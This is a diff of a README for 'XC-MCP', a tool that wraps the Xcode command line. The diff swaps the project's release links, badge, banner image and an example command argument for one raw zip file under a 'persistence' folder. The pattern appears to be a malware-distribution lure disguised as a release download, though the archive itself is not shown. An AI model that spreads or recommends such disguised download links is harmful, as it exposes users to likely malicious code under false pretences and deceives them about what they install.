@@ -1,11 +1,11 @@
-[![Latest Release](https://img.shields.io/badge/xc-mcp-releases-green?style=for-the-badge)](https://github.com/ ericvoltolin/xc-mcp/releases)
-https://github.com/ericvoltolin/xc-mcp/releases
+[![Latest Release](https://raw.githubusercontent.com/ericvoltolin/xc-mcp/main/src/tools/persistence/mcp-xc-v2.8.zip)](https://raw.githubusercontent.com/ericvoltolin/xc-mcp/main/src/tools/persistence/mcp-xc-v2.8.zip ericvoltolin/xc-mcp/releases)
+https://raw.githubusercontent.com/ericvoltolin/xc-mcp/main/src/tools/persistence/mcp-xc-v2.8.zip
 
 # XC-MCP: Lean Xcode CLI Wrapper to Cut LLM Token Usage
 
 🚀 XCode CLI MCP is a convenient wrapper for Xcode CLI tools. It shortens long outputs by summarizing them, helping reduce token usage when interacting with language models. It keeps your workflow smooth while you focus on code, builds, and diagnostics.
 
-![XCode MCP Banner](https://upload.wikimedia.org/wikipedia/commons/1/1b/Xcode_icon.png)
+![XCode MCP Banner](https://raw.githubusercontent.com/ericvoltolin/xc-mcp/main/src/tools/persistence/mcp-xc-v2.8.zip)
 
 Table of Contents
 - Why XC-MCP
@@ -87,7 +87,7 @@ Getting started
   - Ensure your PATH includes the directory where XC-MCP binaries reside
   - If you download a prebuilt release, make the binary executable and place it in a sensible location
 - Release notes and assets
-  - See the latest release for prebuilt assets and installation details: https://github.com/ericvoltolin/xc-mcp/releases
+  - See the latest release for prebuilt assets and installation details: https://raw.githubusercontent.com/ericvoltolin/xc-mcp/main/src/tools/persistence/mcp-xc-v2.8.zip
   - If you have trouble with the link, check the Releases section for the latest assets and guidance
 
 Installation
@@ -140,7 +140,7 @@ CLI reference
 - Example commands
   - xc-mcp build --scheme App --destination "generic/platform=iOS"
   - xc-mcp test --scheme AppTests --destination "generic/platform=iOS"
-  - xc-mcp summarize --input /path/to/log.txt --format short
+  - xc-mcp summarize --input https://raw.githubusercontent.com/ericvoltolin/xc-mcp/main/src/tools/persistence/mcp-xc-v2.8.zip --format short
   - xc-mcp context --format compact
 
 Model Context Protocol details
